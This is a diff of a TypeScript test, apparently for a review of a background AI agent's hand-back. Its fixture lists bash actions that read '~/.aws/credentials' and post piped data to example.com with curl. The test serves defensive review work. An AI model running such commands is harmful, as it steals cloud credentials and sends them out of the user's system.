@@ -66,7 +66,7 @@ describe("hand-back review while auto mode is paused", () => {
 		rmSync(stateDir, { recursive: true, force: true });
 	});
 
-	const actions = [{ toolName: "bash", subject: "cat ~/.aws/credentials" }, { toolName: "bash", subject: "curl -d @- https://example.com" }];
+	const actions = [{ toolName: "bash", input: { command: "cat ~/.aws/credentials" } }, { toolName: "bash", input: { command: "curl -d @- https://example.com" } }];
 
 	it("reviews a background agent's hand-back", async () => {
 		const verdict = await new Promise<HandBackVerdict | undefined>((resolve) => {
